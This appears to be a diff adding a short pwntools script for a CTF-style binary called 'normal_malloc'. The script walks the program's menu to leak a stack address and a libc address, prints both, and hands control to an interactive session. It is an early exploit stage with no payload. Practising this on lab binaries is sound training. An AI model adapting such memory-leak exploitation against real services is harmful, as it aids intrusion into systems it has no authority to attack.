@@ -1,0 +1,27 @@
+from pwn import *
+
+binary='./normal_malloc'
+s=process('./normal_malloc')
+e=ELF(binary)
+log.info("normal_malloc Loaded..")
+
+s.recvuntil(">")
+print s.recv(1024)
+sleep(1)
+s.sendline("3")
+s.recvuntil(":")
+s.sendline("15")
+s.recvuntil("Address : ")
+print(s.recvuntil("\n"))
+stack=int(s.recvuntil("\n"), 16)
+print hex(stack)
+s.recv(1024)
+s.sendline("3")
+s.recvuntil(":")
+s.sendline("7")
+s.recvuntil("Address : ")
+print(s.recvuntil("\n"))
+libc=int(s.recvuntil("\n"), 16)
+print hex(libc)
+s.recv(1024)
+s.interactive()
